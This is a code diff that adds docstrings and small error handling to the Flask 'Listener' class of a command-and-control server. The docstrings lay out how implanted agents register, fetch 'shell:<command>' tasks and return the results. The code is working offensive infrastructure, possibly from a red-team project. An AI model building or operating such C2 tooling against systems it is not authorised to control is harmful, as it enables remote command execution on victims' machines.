@@ -11,6 +11,15 @@ import threading
 import logging
 
 class Listener:
+    """
+    Listener is a socket that can manage multiple agent. It's used to communicate with agents, send task, register agent, receive task result...
+    C2 server can have multiple listener.
+
+    Params:
+        name:String -> listener's name.
+        port:String -> listener's port.
+        ipaddress:String -> listener's ip address.
+    """
     def __init__(self, name, port, ipaddress):
         self.name = name
         self.port = port
@@ -36,24 +45,67 @@ class Listener:
         self.agentsList = self.database.getAgents()
 
     def setAgentsList(self, agentsList):
+        """
+        Methods used to set the list of agents managed by the listener.
+
+        Params:
+            agentsList:Agent[] -> list of agents object.
+        """
         self.agentsList = agentsList
 
     def getAgentsList(self):
+        """
+        Methods used to retrieve agents managed by the listener.
+
+        Returns: 
+            agentsList:Agent[] -> list of agents object.
+        """
         return self.agentsList
 
     def getName(self):
+        """
+        Methods used to get listener's name.
+        """
         return self.name
     
     def getIp(self):
+        """
+        Methods used to get listener's ip.
+        """
         return self.ipaddress
 
     def getPort(self):
+        """
+        Methods used to get listener's port.
+        """
         return self.port
 
     def run(self):
+        """
+        This method need to be called once. It's setup all route used by the listener.
+        
+        Routes :
+            /register -> agent send POST request to this endpoint to be registered.
+            The POST request contains json datatype with this format : 
+                {
+                    "name": "example",
+                    "ip": "1.1.1.1",
+                    "hostname": "DESKTOP-ABC",
+                    "key": "1234"
+                }
+            /getTask?agent=name -> agent send GET request to retrieve his assigned task on text format. Tasks now are just command. Tasks are send with this format :
+                shell:<command>
+            /receiveResult -> agent send POST request to this endpoint to send their task result in json format : 
+                {
+                    "agent":"agentName",
+                    "result":"task result"
+                }
+            /showResult?agent=name -> CLI or Web Interface use this endpoint to retrieve the task result of an agent. This endpoint can return 204 with result not already receive or 200 with the result.
+        """
         @self.app.route('/register', methods=['POST'])
         def register_agent():
             res = request.json
+            print(res)
             agent = Agent(res.get('name'), res.get('ip'), res.get('hostname'), res.get('key'), '{}{}/'.format(self.agentsPath, res.get('name')), self.name)
             self.database.setAgent(agent)
             
@@ -66,6 +118,8 @@ class Listener:
             try:
                 with open('{}{}/task'.format(self.agentsPath, agentName), 'r') as f:
                     task = f.read()
+            except FileNotFoundError:
+                return("[Listener] Agent doesn't have task !", 204)
             except KeyError:
                 return("[Listener] Agent not registered !", 404)
 
@@ -109,11 +163,17 @@ class Listener:
         self.app.run(host=self.ipaddress, port=self.port)
     
     def start(self):
+        """
+        Methods used to start a new daemon that contains the Flask instance for one listener.
+        """
         self.daemon = threading.Thread(name=self.name, target=self.run, daemon=True)
         self.daemon.daemon = True
         self.daemon.start()
         self.isRunning = True
 
     def stop(self):
+        """
+        Methods used to stop a daemon.
+        """
         self.process.terminate()
         self.isRunning = False
